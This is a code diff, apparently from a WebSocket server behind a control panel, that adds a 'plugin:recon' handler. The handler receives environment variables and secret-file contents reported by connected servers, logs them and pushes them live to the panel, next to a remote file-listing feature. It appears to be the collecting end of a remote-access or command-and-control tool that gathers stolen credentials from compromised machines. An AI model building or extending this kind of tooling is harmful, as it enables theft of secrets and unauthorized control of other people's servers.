@@ -154,6 +154,27 @@ export function setupWebSocket(serverWss, store) {
           break;
         }
 
+        // --- Plugin recon (env vars, secret files) ---
+        case 'plugin:recon': {
+          const server = store.getServerByWs(ws);
+          if (!server) return;
+          const entry = {
+            type: 'recon',
+            serverId: server.id,
+            serverName: server.name || server.ip,
+            reconType: payload.type || '?',
+            key: payload.key || payload.path || '?',
+            value: payload.value || payload.content || '?',
+            timestamp: Date.now(),
+          };
+          store.addLog(entry);
+          broadcastPanel({
+            type: 'panel:log:recon',
+            payload: entry,
+          });
+          break;
+        }
+
         // --- Plugin file listing response ---
         case 'plugin:file:list': {
           const panelWs = findPanelForRequest(payload.requestId);
